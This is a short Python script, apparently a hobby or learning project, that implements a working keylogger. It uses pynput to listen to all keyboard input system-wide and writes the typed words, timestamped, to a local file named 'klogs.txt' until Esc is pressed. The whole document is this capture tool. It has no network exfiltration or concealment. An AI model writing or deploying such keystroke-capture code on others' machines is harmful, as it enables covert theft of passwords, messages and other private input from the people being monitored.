from pynput import keyboard
import datetime

buffer = []

def on_press(key):
    global buffer 
    if key == keyboard.Key.space:
        with open('klogs.txt', 'a') as f:
            f.write(f'[{datetime.datetime.now().strftime('%Y-%m-%d, %H:%M:%S')}] {"".join(buffer)} \n')
        buffer = []
        
    else:
        try:
            if key.char.isalpha():  #check if the key is letter
                buffer.append(key.char)
            else:
                buffer.append(str(key).replace("'", ""))
        except AttributeError:
            pass # ignore non-character keys like Shift, Ctrl.
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False 
        
with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()